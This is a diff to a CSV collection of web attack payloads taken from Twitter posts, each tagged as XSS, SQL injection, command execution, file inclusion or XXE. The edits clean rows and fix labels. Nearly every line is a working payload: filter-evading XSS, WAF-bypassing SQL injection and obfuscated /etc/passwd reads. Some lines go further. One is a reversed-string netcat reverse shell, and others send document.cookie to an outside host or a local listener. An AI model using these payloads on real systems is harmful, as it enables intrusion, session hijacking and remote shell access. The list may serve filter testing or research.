@@ -21,7 +21,6 @@ https://twitter.com/3XS0/status/1310398146443382784,<svg onload=&#97&#108&#101&#
 https://twitter.com/_Y000_/status/1309030446039273472,"<svg onload='new Function`[""_Y000!_""].find(al\u0065rt)`'>",xss
 https://twitter.com/su13ym4n/status/1308696263869825024,$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev),rce
 https://twitter.com/3XS0/status/1304506926911434758,<svg%09%0a%0b%0c%0d%a0%00%20onload=alert (1)>,xss
-https://twitter.com/notsoshant/status/1302529726393786368,q= ... select ... <CRLF> from ...,sqli
 https://twitter.com/infosecsanyam/status/1301416231157850112,"Function(""\x61\x6c\x65\x72\x74\x28\x31\x29"")();",xss
 https://twitter.com/_Y000_/status/1300943712361611265,"<svg onload=alert("""")>",xss
 https://twitter.com/_Y000_/status/1300943712361611265,"<svg onload=alert%26%230000000040"""")>",xss
@@ -66,7 +65,6 @@ https://twitter.com/OAcybersecurity/status/1261464886556585984,"<?xml version=""
 https://twitter.com/su__charlie/status/1261018373862961153,"""on{{click=prompt(document['cookie'])/*}}*/>",xss
 https://twitter.com/3XS0/status/1259679748130734080,"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;"">XXXXX</a>",xss
 https://twitter.com/_Y000_/status/1259495435355467783,"%55%4eiON SeLeCt 1,2...",sqli
-https://twitter.com/GochaOqradze/status/1257023309411213314,"""><P/onweel=alert(1)>mouse wheel here<!--",xss
 https://twitter.com/GochaOqradze/status/1257023309411213314,%22%3e%3c%5K/onwheel=alert(1)%3emouse%20wheel%20here%3c%21--,xss
 https://twitter.com/johnsto44673062/status/1256554534664536065,"<video src=x onerror=""prompt(xss"">",xss
 https://twitter.com/johnsto44673062/status/1256554534664536065,"<video src=x onerror=""prompt(xss)"">",xss
@@ -80,7 +78,6 @@ https://twitter.com/sratarun/status/1253020991732584448,%3Cx/Onpointerrawupdate=
 https://twitter.com/parzel2/status/1252858558376407041,%60%2balert/**/(1)%2b%60,xss
 https://twitter.com/zapstiko/status/1252827433293590528,"<details/open/ontoggle=""self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"">",xss
 https://twitter.com/_Y000_/status/1252795854362009600,"union (/*!/**/ SeleCT */ 1,2....)",sqli
-https://twitter.com/_Y000_/status/1252795854362009600,unhex(hex(Concat(your sql query))),sqli
 https://twitter.com/XssPayloads/status/1251014936077221888,"tarun""><x/onafterscriptexecute=confirm%26lpar;)//",xss
 https://twitter.com/kmkz_security/status/1250753618376097792,{{constructor.constructor('eval(atob(\'amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUp\'))')()}},xss
 https://twitter.com/spyerror/status/1250032421753495555,"≋ ""><!'/*""*\'/*\""/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># ≋",xss
@@ -102,11 +99,11 @@ https://twitter.com/ddhkttmm/status/1235234835939168257,;+$u+cat+/etc$u/passwd$u
 https://twitter.com/ddhkttmm/status/1235234835939168257,;+$u+cat+/etc$u/passwd+\#,rce
 https://twitter.com/ddhkttmm/status/1235234835939168257,/???/??t+/???/??ss??,rce
 https://twitter.com/ddhkttmm/status/1235234835939168257,/?in/cat+/et?/passw?,rce
-https://twitter.com/gmishra010/status/1230089478980587521,* alert() => window['alert'](),xss
-https://twitter.com/gmishra010/status/1230089478980587521,* alert() => this['alert'](),xss
-https://twitter.com/gmishra010/status/1230089478980587521,* alert() => (alert)(),xss
-https://twitter.com/gmishra010/status/1230089478980587521,* alert() => eval(atob('YWxlcnQoKQ==')),xss
-https://twitter.com/gmishra010/status/1230089478980587521,* document.cookie => document['cookie'],xss
+https://twitter.com/gmishra010/status/1230089478980587521,window['alert'](),xss
+https://twitter.com/gmishra010/status/1230089478980587521,this['alert'](),xss
+https://twitter.com/gmishra010/status/1230089478980587521,(alert)(),xss
+https://twitter.com/gmishra010/status/1230089478980587521,eval(atob('YWxlcnQoKQ==')),xss
+https://twitter.com/gmishra010/status/1230089478980587521,document['cookie'],xss
 https://twitter.com/rodoassis/status/1227228412177211393,<svg onx=() onload=(confirm)(1)>,xss
 https://twitter.com/_Y000_/status/1225815594085126144,/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+,sqli
 https://twitter.com/bendtheory/status/1225556928182525955,<img src onerror=confirm(1)>,xss
@@ -121,27 +118,21 @@ https://twitter.com/El3ctr0Byt3s/status/1319344216808562688,"""></textarea><ScRi
 https://twitter.com/MacRunMe/status/1223675832641708037,"«input»; p=-alert(1)}//\ $result* var n = {a: ""-alert(1)}//\"", b: ""-alert(1)}//\""};",xss
 https://twitter.com/MacRunMe/status/1223675832641708037,"«input»; p=\&q=-alert(1)// $result* var n = {a: ""\"", b: ""-alert(1)}//""};",xss
 https://twitter.com/niksthehacker/status/1223335698318548992,"<x onauxclick=a=alert,a(domain)>click",xss
-https://twitter.com/wugeej/status/1222738371547516929,hxxps://www.starbucks.com.br/testing%2522%2520accesskey='x'%2520onclick='confirm%601%60',xss
-https://twitter.com/wugeej/status/1222738371547516929,hxxps://www.starbucks.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60',xss
+https://twitter.com/wugeej/status/1222738371547516929,'x'%2520onclick='confirm%601%60',xss
 https://twitter.com/wugeej/status/1222325340820795392,%0A%0d+select+user+from+dual+%0A%0D,sqli
 https://twitter.com/XssPayloads/status/1213991455892488192,image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>,xss
 https://twitter.com/a_l_e_r_t_1_/status/1213493272657760263,""">'><details/open/ontoggle=confirm('XSS')>",xss
-https://twitter.com/zabirao29/status/1211866081377296384,"<a href=""<?=strip_tags($_GET['url']);?>"">",xss
 https://twitter.com/zabirao29/status/1211866081377296384,"?url=""onm<>ouseover=""ale<>rt(1)",xss
 https://twitter.com/mashoud1122/status/1210492657572761600,document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>'),xss
 https://twitter.com/zapstiko/status/1206094254684008449,window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1),xss
 https://twitter.com/XssPayloads/status/1203945018861465601,"<img src=something onauxclick=""new Function `al\ert\`xss\``"">",xss
-https://twitter.com/kokail/status/1199799446151802881,"<a href=""<?=strip_tags($_GET['url']);?>"">",xss
 https://twitter.com/kokail/status/1199799446151802881,"?url=""onm<>ouseover=""ale<>rt(1)",xss
-https://twitter.com/Elawadly77/status/1199486255085576192,"""un<>ion sel<>ect""",xss
+https://twitter.com/Elawadly77/status/1199486255085576192,"""un<>ion sel<>ect""",sqli
 https://twitter.com/_Y000_/status/1198980679855419398,/*!50000%55nIoN*/+/*!50000%53eLeCt*/+,sqli
 https://twitter.com/Bc10ver/status/1198680092479807488,`payload´; %3Cimg src='null' onerror=alert('spyerror')%3E,xss
 https://twitter.com/XssPayloads/status/1197436457889218561,<details onauxclick=confirm`xss`></details>,xss
-https://twitter.com/rootpentesting/status/1195367343750307840,ile:///etc/passwd,lfi
 https://twitter.com/rootpentesting/status/1195367343750307840,file:///etc/./passwd,lfi
-https://twitter.com/IIAnaisII_289/status/1195115835997724672,"<style>
-@keyframes
- a{}b{animation:a;}</style> <b/onanimationstart=prompt`${document.domain}&#x60;>",xss
+https://twitter.com/IIAnaisII_289/status/1195115835997724672,"<style>@keyframes a{}b{animation:a;}</style> <b/onanimationstart=prompt`${document.domain}&#x60;>",xss
 https://twitter.com/Jonathan_Dupre/status/1193896097292464129,`curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`,rce
 https://twitter.com/aceb0nd/status/1193677117415813120,"<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document[""cook""+""ie""]' src=x>",xss
 https://twitter.com/DakkarKey/status/1192567403160334336,<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click,xss
@@ -162,7 +153,7 @@ https://twitter.com/blkryd/status/1188919882919772160,<svg%0Aonauxclick=0;[1].so
 https://twitter.com/ArmanSameer95/status/1188836135809748992,"(xss""><!--><svg/onload=alert(document.domain)>)",xss
 https://twitter.com/knoxss_me/status/1188829588903858177,<base href=//knoxss.me>,xss
 https://twitter.com/wugeej/status/1187159509715697670,"<!ENTITY % data SYSTEM ""netdoc:/etc/passwd"">",xxe
-https://twitter.com/daudmalik06/status/1186573099715702784,sle%25p%28'0x12'%2b1) => sleep('ox12' + 1),rce
+https://twitter.com/daudmalik06/status/1186573099715702784,sle%25p%28'0x12'%2b1) => sleep('ox12' + 1),sqli
 https://twitter.com/_MrB0b/status/1185847682407059456,<form><button formaction=javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`));//,xss
 https://twitter.com/wugeej/status/1185023799067963392,"""<> au<>tof<>ocus o<>nfo<>cus=<>al<>ert<>(1<>)",xss
 https://twitter.com/bendtheory/status/1183964435846762498,""" onauxclick=confirm`xss` """,xss
@@ -186,15 +177,11 @@ https://twitter.com/spyerror/status/1168414139401887744,<img src=x:alert(alt) on
 https://twitter.com/spyerror/status/1168414139401887744,"""></tag><svg onload=alert(spyerror)>",xss
 https://twitter.com/wugeej/status/1168337434989355009,"<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>",xss
 https://twitter.com/anonymops_ID/status/1167854274769903617,<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>,xss
-https://twitter.com/spyerror/status/1166146256231682049,"["" <style>
-@KeyFrames
-
- z{</style><div style=animation-name:z onanimationend=&#97&#108&#101&#114&#116&grave;1&grave;> %253Cscript%253Ealert('XSS')%253C%252Fscript%253E ""</script> ""]",xss
+https://twitter.com/spyerror/status/1166146256231682049,"["" <style>@KeyFrames z{</style><div style=animation-name:z onanimationend=&#97&#108&#101&#114&#116&grave;1&grave;> %253Cscript%253Ealert('XSS')%253C%252Fscript%253E ""</script> ""]",xss
 https://twitter.com/Binary_Newb/status/1164586905221992448,<!<script>alert(1)</script> “,xss
 https://twitter.com/WilliamSerizao/status/1164487711635464193,"<details open ontoggle='self[""ale""%2b""rt""]&lpar;document&period;domain&rpar;'>",xss
 https://twitter.com/bohdansec/status/1164291786828931078,<svg/onload=%26nbsp;alert`bohdan`+,xss
 https://twitter.com/page_1337/status/1164291647624097797,<img src onerror=%26emsp;prompt`${document.domain}`>,xss
-https://twitter.com/spyerror/status/1164264620833562625,%3Cspyerror%20script%20goes%20here%3E=%0AByPass,xss
 https://twitter.com/spyerror/status/1164264620833562625,%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E,xss
 https://twitter.com/zapstiko/status/1163830136417865728,"<iframe/onload='this[""src""]=""jav""+""as&Tab;cr""+""ipt:al""+""er""+""t()""';>",xss
 https://twitter.com/zapstiko/status/1163830136417865728,<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//,xss
@@ -216,7 +203,6 @@ https://twitter.com/le4rner/status/1153661387693936640,"<details open ontoggle="
 https://twitter.com/zhu87069511/status/1151475903299371008,"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerror=eval}throw/0/+name>H</j>#x",xss
 https://twitter.com/wugeej/status/1151275999583014912,%20foo_bar%00=foo%20bar%00=foo%5bbarfoo[bar,xss
 https://twitter.com/brutelogic/status/1148610104738099201,"data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post><input type=hidden name=a value=""<img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`>""><input type=submit></form>",xss
-https://twitter.com/wugeej/status/1148451213542748160,form%5bid=user_register_form,xss
 https://twitter.com/RenwaX23/status/1147129395817123840,"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerror=eval}throw/0/+name>H</j>#x",xss
 https://twitter.com/bohdansec/status/1146901932088451073,"1'""><img/src/onerror=.1|alert``>",xss
 https://twitter.com/f7nascimento/status/1144215551302090753,<!<script>alert(document.domain)</script>,xss
@@ -237,9 +223,6 @@ https://twitter.com/sratarun/status/1131786947184275456,"><tag onxxxx=""'a'|aler
 https://twitter.com/yeswehack/status/1130413802732904450,"<iframe name=""<svg/onload=alert(23)>"" src=""http://example[.]com/x.php?age=23;%0adocument.body.innerHTML=name//"">",xss
 https://twitter.com/yeswehack/status/1130413802732904450,http://example[.]com/x.php?age=23;%0adocument.body.innerHTML=location.hash;//#<svg/onload=alert(23)>,xss
 https://twitter.com/hungrybytes/status/1129501917216956416,"<svg onload\r\n=$.globalEval(""al""+""ert()"");>",xss
-https://twitter.com/fransrosen/status/1126963506723590148,"<style>
-@keyframes
- a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>",xss
 https://twitter.com/0xInfection/status/1123219386825711616,<input/oninput='new Function`confir\u006d\`0\``'>,xss
 https://twitter.com/Bc10ver/status/1122682047821172743,"<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme",xss
 https://twitter.com/Bc10ver/status/1122085759257853952,<lol/onauxclick=[0].some(alert)>rightclickhere,xss
@@ -314,7 +297,6 @@ https://twitter.com/TricksTerCloWn/status/621826867151175681,/**/ORDER/**/BY/**/
 https://twitter.com/TricksTerCloWn/status/621826867151175681,/*!order*/+/*!by*/,sqli
 https://twitter.com/TricksTerCloWn/status/621826867151175681,/*!ORDER BY*/,sqli
 https://twitter.com/TricksTerCloWn/status/621826867151175681,/*!50000ORDER BY*/,sqli
-https://twitter.com/NaveenS16/status/595230999044206592,"<a href=""<?php echo strip_tags($_GET['url']) ?>"">",rce
 https://twitter.com/NaveenS16/status/595230999044206592,"?url=""onm<>ouseover=""ale<>rt(0)",xss
 https://twitter.com/mazen160/status/592832286019694592,"<img/src=""x""/onerror=""prom\u0070t&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;"">",xss
 https://twitter.com/soaj1664ashar/status/592228254666326016,"""><h2 id=""Iamheading""onmouseover=""confirm(1)"">",xss
